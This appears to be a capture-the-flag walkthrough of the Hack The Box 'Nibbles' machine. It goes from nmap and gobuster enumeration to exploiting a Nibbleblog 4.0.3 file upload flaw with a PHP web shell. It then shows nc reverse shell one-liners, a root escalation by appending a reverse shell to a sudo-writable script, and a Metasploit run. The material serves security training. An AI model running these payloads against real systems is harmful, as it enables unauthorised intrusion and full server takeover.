## Enumeration
	- Let's start by scanning the top 10 most common ports and saving the output. Here we will output the greppable format to stdout with `-oG -` and `-v` for verbose output. Since no target is specified, the scan will fail but will show the ports scanned. Finally, we will output all scan formats using `-oA`.
	- ```bash
	  nmap -sV --open -oA nibbles_initial_scan 10.129.42.190
	  ```
	- we can run a full TCP port scan using the command `nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190`. This will scan all 65,535 ports. It will take a while.
	- ```bash
	  nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190
	  ```
	- Let's  banner grab the ssh port using nc
	- ```bash
	  nc -nv 10.129.42.190 22
	  ```
	- ```output
	  (UNKNOWN) [10.129.42.190] 22 (ssh) open
	  SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
	  ```
	- We can see it is running an OpenSSH server. We can do the same for HTTP.
	- ```bash
	  nc -nv 10.129.42.190 80
	  ```
	- ```output
	  (UNKNOWN) [10.129.42.190] 80 (http) open
	  ```
	- In this case, we do not get a banner. Let's attempt to do an nmap script scan on the two open ports.
	- **Warning:** nmap script scans can be intrusive. You can read about the scripts [here](https://nmap.org/nsedoc/categories/default.html).
	- ```bash
	  nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190
	  ```
	- ```output
	  Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:39 EST
	  Nmap scan report for 10.129.42.190
	  Host is up (0.11s latency).
	  
	  PORT   STATE SERVICE
	  22/tcp open  ssh
	  | ssh-hostkey: 
	  |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
	  |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
	  |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
	  80/tcp open  http
	  |_http-title: Site doesn't have a title (text/html).
	  
	  Nmap done: 1 IP address (1 host up) scanned in 4.42 seconds
	  ```
	- We did not get anything useful. Let's try to use the [http-enum script](https://nmap.org/nsedoc/scripts/http-enum.html), which can be used to enumerate common web application directories.
	- ```bash
	  nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190 
	  ```
	- ```output
	  Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:41 EST
	  Nmap scan report for 10.129.42.190
	  Host is up (0.11s latency).
	  Not shown: 998 closed ports
	  PORT   STATE SERVICE VERSION
	  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	  80/tcp open  http    Apache httpd <REDACTED> ((Ubuntu))
	  |_http-server-header: Apache/<REDACTED> (Ubuntu)
	  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	  
	  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	  Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
	  ```
	- Here, we also did not get anything useful.
- ## Web Footprinting
	- We can use whatweb to identify the web application in use
	- ```bash
	  whatweb 10.129.42.190
	  ```
	- ```output
	  http://10.129.42.190 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190]
	  ```
	- This tool does not identify any standard web technologies in use. Browsing to the target in `Firefox` shows us a simple "Hello world!" message. We can also use cURL
	- ```bash
	  curl http://10.129.42.190
	  ```
	- ```html
	  <b>Hello world!</b>
	  
	  <!-- /nibbleblog/ directory. Nothing interesting here! -->
	  ```
	- The HTML comment mentions a directory named `nibbleblog`. Let us check this with `whatweb`.
	- ```bash
	  whatweb http://10.129.42.190/nibbleblog
	  ```
	- ```output
	  http://10.129.42.190/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], RedirectLocation[http://10.129.42.190/nibbleblog/], Title[301 Moved Permanently]
	  http://10.129.42.190/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
	  ```
	- Now we are starting to get a better picture of things. We can see some of the technologies in use such as [HTML5](https://en.wikipedia.org/wiki/HTML5), [jQuery](https://en.wikipedia.org/wiki/JQuery), and [PHP](https://en.wikipedia.org/wiki/PHP). We can also see that the site is running [Nibbleblog](https://www.nibbleblog.com/), which is a free blogging engine built using PHP.
	- Browsing to the `/nibbleblog` directory in `Firefox`, we do not see anything exciting on the main page.
	- A quick Google search for "nibbleblog exploit" yields this [Nibblblog File Upload Vulnerability](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/). The flaw allows an authenticated attacker to upload and execute arbitrary PHP code on the underlying web server. The `Metasploit` module in question works for version `4.0.3`. We do not know the exact version of `Nibbleblog` in use yet, but it is a good bet that it is vulnerable to this. If we look at the source code of the `Metasploit` module, we can see that the exploit uses user-supplied credentials to authenticate the admin portal at `/admin.php`.
	- Let us use [Gobuster](https://github.com/OJ/gobuster) to be thorough and check for any other accessible pages/directories.
	- ```bash
	  gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
	  ```
	- ```output
	  ===============================================================
	  
	  Gobuster v3.0.1
	  
	  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
	  ===============================================================
	  
	  [+] Url:            http://10.129.42.190/nibbleblog/
	  [+] Threads:        10
	  [+] Wordlist:       /usr/share/dirb/wordlists/common.txt
	  [+] Status codes:   200,204,301,302,307,401,403
	  [+] User Agent:     gobuster/3.0.1
	  [+] Timeout:        10s
	  ===============================================================
	  2020/12/17 00:10:47 Starting gobuster
	  ===============================================================
	  /.hta (Status: 403)
	  /.htaccess (Status: 403)
	  /.htpasswd (Status: 403)
	  /admin (Status: 301)
	  /admin.php (Status: 200)
	  /content (Status: 301)
	  /index.php (Status: 200)
	  /languages (Status: 301)
	  /plugins (Status: 301)
	  /README (Status: 200)
	  /themes (Status: 301)
	  ===============================================================
	  2020/12/17 00:11:38 Finished
	  ===============================================================
	  ```
	- `Gobuster` finishes very quickly and confirms the presence of the `admin.php` page. We can check the `README` page for interesting information, such as the version number.
	- ```bash
	  curl http://10.129.42.190/nibbleblog/README
	  ```
	- ```output
	  ====== Nibbleblog ======
	  Version: v4.0.3
	  Codename: Coffee
	  Release date: 2014-04-01
	  
	  Site: http://www.nibbleblog.com
	  Blog: http://blog.nibbleblog.com
	  Help & Support: http://forum.nibbleblog.com
	  Documentation: http://docs.nibbleblog.com
	  
	  ===== Social =====
	  
	  * Twitter: http://twitter.com/nibbleblog
	  * Facebook: http://www.facebook.com/nibbleblog
	  * Google+: http://google.com/+nibbleblog
	  
	  ===== System Requirements =====
	  
	  * PHP v5.2 or higher
	  * PHP module - DOM
	  * PHP module - SimpleXML
	  * PHP module - GD
	  * Directory “content” writable by Apache/PHP
	  
	  <SNIP>
	  ```
	- This reveals that 4.0.3 is in use, which is vulnerable to the metasploit module.
	- Let us check out the admin portal login page. Now, to use the exploit mentioned above, we will need valid admin credentials. We can try some authorization bypass techniques and common credential pairs manually, such as `admin:admin` and `admin:password`, to no avail. There is a reset password function, but we receive an e-mail error. Also, too many login attempts too quickly trigger a lockout with the message `Nibbleblog security error - Blacklist protection`.
	- Let us go back to our directory brute-forcing results. The `200` status codes show pages/directories that are directly accessible. The `403` status codes in the output indicate that access to these resources is forbidden. Finally, the `301` is a permanent redirect. Let us explore each of these. Browsing to `nibbleblog/themes/`. We can see that directory listing is enabled on the web application. Maybe we can find something interesting while poking around?
	- Browsing to `nibbleblog/content` shows some interesting subdirectories `public`, `private`, and `tmp`. Digging around for a while, we find a `users.xml`
	   file which at least seems to confirm the username is indeed admin. It 
	  also shows blacklisted IP addresses. We can request this file with `cURL` and prettify the `XML` output using [xmllint](https://linux.die.net/man/1/xmllint).
	- ```bash
	  curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -
	  ```
	- ```output
	  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
	  <users>
	    <user username="admin">
	      <id type="integer">0</id>
	      <session_fail_count type="integer">2</session_fail_count>
	      <session_date type="integer">1608182184</session_date>
	    </user>
	    <blacklist type="string" ip="10.10.10.1">
	      <date type="integer">1512964659</date>
	      <fail_count type="integer">1</fail_count>
	    </blacklist>
	    <blacklist type="string" ip="10.10.14.2">
	      <date type="integer">1608182171</date>
	      <fail_count type="integer">5</fail_count>
	    </blacklist>
	  </users>
	  ```
	- At this point, we have a valid username but no password. Searches of 
	  Nibbleblog related documentation show that the password is set during 
	  installation, and there is no known default password. Up to this point, 
	  have the following pieces of the puzzle:
		- A Nibbleblog install potentially vulnerable to an authenticated file upload vulnerability
		- An admin portal at `nibbleblog/admin.php`
		- Directory listing which confirmed that `admin` is a valid username
		- Login brute-forcing protection blacklists our IP address after too 
		  many invalid login attempts. This takes login brute-forcing with a tool 
		  such as [Hydra](https://github.com/vanhauser-thc/thc-hydra) off the table
	- There are no other ports open, and we did not find any other 
	  directories. Which we can confirm by performing additional directory 
	  brute-forcing against the root of the web application
	- ```bash
	  gobuster dir -u http://10.129.42.190/ --wordlist /usr/share/dirb/wordlists/common.txt
	  ```
	- ```output
	  ===============================================================
	  Gobuster v3.0.1
	  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
	  ===============================================================
	  [+] Url:            http://10.129.42.190/
	  [+] Threads:        10
	  [+] Wordlist:       /usr/share/dirb/wordlists/common.txt
	  [+] Status codes:   200,204,301,302,307,401,403
	  [+] User Agent:     gobuster/3.0.1
	  [+] Timeout:        10s
	  ===============================================================
	  2020/12/17 00:36:55 Starting gobuster
	  ===============================================================
	  /.hta (Status: 403)
	  /.htaccess (Status: 403)
	  /.htpasswd (Status: 403)
	  /index.html (Status: 200)
	  /server-status (Status: 403)
	  ===============================================================
	  2020/12/17 00:37:46 Finished
	  ===============================================================
	  ```
	- Taking another look through all of the exposed directories, we find a `config.xml` file.
	- ```bash
	  curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -
	  ```
	- Checking it, hoping for passwords proofs fruitless, but we do see two mentions of `nibbles`
	  in the site title as well as the notification e-mail address. This is 
	  also the name of the box. Could this be the admin password?
	- When performing password cracking offline with a tool such as `Hashcat`
	  or attempting to guess a password, it is important to consider all of 
	  the information in front of us. It is not uncommon to successfully crack
	  a password hash (such as a company's wireless network passphrase) using
	  a wordlist generated by crawling their website using a tool such as [CeWL](https://github.com/digininja/CeWL).
	- This shows us how crucial thorough enumeration is. Let us recap what we have found so far:
		- We started with a simple `nmap` scan showing two open ports
		- Discovered an instance of `Nibbleblog`
		- Analyzed the technologies in use using `whatweb`
		- Found the admin login portal page at `admin.php`
		- Discovered that directory listing is enabled and browsed several directories
		- Confirmed that `admin` was the valid username
		- Found out the hard way that IP blacklisting is enabled to prevent brute-force login attempts
		- Uncovered clues that led us to a valid admin password of nibbles
	- This proves that we need a clear, repeatable process that we will use
	  time and time again, no matter if we are attacking a single box on HTB,
	  performing a web application penetration test for a client, or 
	  attacking a large Active Directory environment. Keep in mind that 
	  iterative enumeration, along with detailed notetaking, is one of the 
	  keys to success in this field. As you progress in your career, you will 
	  often marvel at how the initial scope of a penetration test seemed 
	  extremely small and "boring," yet once you dig in and perform rounds and
	  rounds of enumeration and peel back the layers, you may find an exposed
	  service on a high port or some forgotten page or directory that can 
	  lead to sensitive data exposure or even a foothold.
- ## Initial Foothold
	- When we gain access to the admin console, we see several options:
		- Publish - making a new post, video post, quote post, or new page. It could be interesting.
		- Comments - shows no published comments
		- Manage - Allows us to manage posts, pages, and categories.
		- Settings - Scrolling to the bottom confirms the version, but none seem too interesting.
		- Themes - Allows us to instlal a theme.
		- Plugins - Allows us to configure, install, or uninstall plugins. The `My image` plugin allows us to upload an image file. Could this be abused to upload `PHP` code potentially?
	- Let us check out the plugins page. We see we can upload an image. Let's try uploading the following php code instead.
	- ```php
	  <?php system('id'); ?>
	  ```
	- We get several errors but it appears that the file uploaded
	- ```output
	  Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26
	  
	  Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27
	  
	  Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117
	  
	  Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118
	  
	  Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43
	  
	  Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
	  ```
	- Now we have to find out where the file uploaded if it was successful. Going back to the directory brute-forcing results, we remember the `/content` directory. Under this, there is a `plugins` directory and another subdirectory for `my_image`. The full path is at `http://<host>/nibbleblog/content/private/plugins/my_image/`. In this directory, we see two files, `db.xml` and `image.php`, with a recent last modified date, meaning that our upload was successful! Let us check and see if we have command execution.
	- ```bash
	  curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
	  ```
	- ```output
	  uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
	  ```
	- We do! It looks like we have gained remote code execution on the web server, and the Apache server is running in the `nibbler` user context. Let us modify our PHP file to obtain a reverse shell and start poking around the server.
	- Let us edit our local PHP file and upload it again. This command should 
	  get us a reverse shell. As mentioned earlier in the Module, there are 
	  many reverse shell cheat sheets out there. Some great ones are [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and [HighOn,Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).
	- Let's modify the following bash oneliner:
	  ```bash
	  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKING IP] [LISTENING PORT] >/tmp/f
	  ```
	- We will add our `tun0` VPN IP address in the `<ATTACKING IP>` placeholder and a port of our choice for `<LISTENING PORT>` to catch the reverse shell on our `netcat` listener. See the edited `PHP` script below.
	- ```php
	  <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
	  ```
	- We upload the file again and start a `netcat` listener in our terminal:
	- ```bash
	  nc -lvnp 9443
	  ```
	- We can get a prettier shell. Let's try using python
	- ```bash
	  python -c 'import pty; pty.spawn("/bin/bash")'
	  ```
	- We get an error saying python not found. Let's try
	- ```bash
	  which python3
	  ```
	- This returns the location of python3. So let's get our shell with
	- ```bash
	  python3 -c 'import pty; pty.spawn("/bin/bash")'
	  ```
- ## Privilege Escalation
	- Now that we have a reverse shell connection, it is time to escalate privileges. We can unzip the `personal.zip` file and see a file called `monitor.sh`.
	- ```bash
	  unzip personal.zip
	  ```
	- ```output
	  unzip personal.zip
	  Archive:  personal.zip
	     creating: personal/
	     creating: personal/stuff/
	    inflating: personal/stuff/monitor.sh 
	  ```
	- The shell script `monitor.sh` is a monitoring script, and it is owned by our `nibbler` user and writeable.
	- Let us put this aside for now and pull in [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
	   to perform some automated privilege escalation checks. First, download 
	  the script to your local attack VM or the Pwnbox and then start a `Python` HTTP server using the command `sudo python3 -m http.server 8080`.
	- ```bash
	  sudo python3 -m http.server 8080
	  ```
	- Back on the target type `wget http://<your ip>:8080/LinEnum.sh`
	   to download the script. If successful, we will see a 200 success response on our Python HTTP server. Once the script is pulled over, type `chmod +x LinEnum.sh` to make the script executable and then type `./LinEnum.sh` to run it. We see a ton of interesting output but what immediately catches the eye are `sudo` privileges.
	- ```output
	  [+] We can sudo without supplying a password!
	  Matching Defaults entries for nibbler on Nibbles:
	      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	  
	  User nibbler may run the following commands on Nibbles:
	      (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
	  
	  
	  [+] Possible sudo pwnage!
	  /home/nibbler/personal/stuff/monitor.sh
	  ```
	- The `nibbler` user can run the file `/home/nibbler/personal/stuff/monitor.sh`
	   with root privileges. Being that we have full control over that file, 
	  if we append a reverse shell one-liner to the end of it and execute with
	   `sudo` we should get a reverse shell back as the root user. Let us edit the `monitor.sh` file to append a reverse shell one-liner.
	- ```bash
	  echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
	  ```
	- If we cat the `monitor.sh` file, we will see the contents appended to the end. **It is crucial if we ever encounter a situation where we can leverage a writeable file for privilege escalation. We only append to the end of the file (after making a backup copy of the file) to avoid overwriting it and causing a disruption.** Execute the script with `sudo`:
	- ```bash
	  sudo /home/nibbler/personal/stuff/monitor.sh 
	  ```
	- Finally, catch the root shell on our waiting `nc` listener.
	- ```bash
	  nc -lvnp 8443
	  ```
	- From here, we can grab the `root.txt` flag. Finally, we have 
	  now solved our first box on HTB. Try to replicate all of the steps on 
	  your own. Try various tools to achieve the same effect. We can use many 
	  different tools for the various steps required to solve this box. This 
	  walkthrough shows one possible method. Make sure to take detailed notes 
	  to practice that vital skillset.
- ## Metasploit
	- As discussed earlier, there is also a `Metasploit` module that works for this box. It is considerably more straightforward, but it is worth practicing both methods to become familiar with as many tools and techniques as possible. Start `Metsaploit` from your attack box by typing `msfconsole`. Once loaded, we can search for the exploit.
	- ```
	  msf6 > search nibbleblog
	  
	  Matching Modules
	  ================
	  
	     #  Name                                       Disclosure Date  Rank       Check  Description
	  
	  -  ----                                       ---------------  ----       -----  -----------
	  
	     0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability
	  
	  
	  Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload
	  
	  ```
	- We can then type `use 0` to load the selected exploit. Set the `rhosts` option as the target IP address and `lhosts` as the IP address of your `tun0` adapter (the one that comes with the VPN connection to HackTheBox).
	- ```
	  msf6 > use 0
	  [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
	  
	  msf6 exploit(multi/http/nibbleblog_file_upload) > set rhosts 10.129.42.190
	  rhosts => 10.129.42.190
	  msf6 exploit(multi/http/nibbleblog_file_upload) > set lhost 10.10.14.2 
	  lhost => 10.10.14.2
	  ```
	- Type show options to see what other options need to be set.
	- ```
	  msf6 exploit(multi/http/nibbleblog_file_upload) > show options 
	  
	  Module options (exploit/multi/http/nibbleblog_file_upload):
	  
	    Name       Current Setting  Required  Description
	  ----       ---------------  --------  -----------
	    PASSWORD                    yes       The password to authenticate with
	    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
	    RHOSTS     10.129.42.190    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
	    RPORT      80               yes       The target port (TCP)
	    SSL        false            no        Negotiate SSL/TLS for outgoing connections
	    TARGETURI  /                yes       The base path to the web application
	    USERNAME                    yes       The username to authenticate with
	    VHOST                       no        HTTP server virtual host
	  
	  
	  Payload options (php/meterpreter/reverse_tcp):
	  
	    Name   Current Setting  Required  Description
	  ----   ---------------  --------  -----------
	    LHOST  10.10.14.2       yes       The listen address (an interface may be specified)
	    LPORT  4444             yes       The listen port
	  
	  
	  Exploit target:
	  
	    Id  Name
	  --  ----
	    0   Nibbleblog 4.0.3
	  ```
	- We need to set the admin username and password `admin:nibbles` and the `TARGETURI` to `nibbleblog`.
	- ```
	  msf6 exploit(multi/http/nibbleblog_file_upload) > set username admin
	  username => admin
	  msf6 exploit(multi/http/nibbleblog_file_upload) > set password nibbles
	  password => nibbles
	  msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi nibbleblog
	  targeturi => nibbleblog
	  ```
	- We also need to change the payload type. For our purposes let's go with `generic/shell_reverse_tcp`. We put these options and then type `exploit` and receive a reverse shell.
	- ```
	  msf6 exploit(multi/http/nibbleblog_file_upload) > set payload generic/shell_reverse_tcp
	  payload => generic/shell_reverse_tcp
	  msf6 exploit(multi/http/nibbleblog_file_upload) > show options 
	  
	  Module options (exploit/multi/http/nibbleblog_file_upload):
	  
	     Name       Current Setting  Required  Description
	     ----       ---------------  --------  -----------
	     PASSWORD   nibbles          yes       The password to authenticate with
	     Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
	     RHOSTS     10.129.42.190  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
	     RPORT      80               yes       The target port (TCP)
	     SSL        false            no        Negotiate SSL/TLS for outgoing connections
	     TARGETURI  nibbleblog       yes       The base path to the web application
	     USERNAME   admin            yes       The username to authenticate with
	     VHOST                       no        HTTP server virtual host
	  
	  
	  Payload options (generic/shell_reverse_tcp):
	  
	     Name   Current Setting  Required  Description
	     ----   ---------------  --------  -----------
	     LHOST  10.10.14.2      yes       The listen address (an interface may be specified)
	     LPORT  4444            yes       The listen port
	  
	  
	  Exploit target:
	  
	     Id  Name
	     --  ----
	     0   Nibbleblog 4.0.3
	  
	  
	  msf6 exploit(multi/http/nibbleblog_file_upload) > exploit
	  
	  [*] Started reverse TCP handler on 10.10.14.2:4444 
	  [*] Command shell session 4 opened (10.10.14.2:4444 -> 10.129.42.190:53642) at 2021-04-21 16:32:37 +0000
	  [+] Deleted image.php
	  
	  id
	  uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
	  ```
	- From here, we can follow the same privilege escalation path.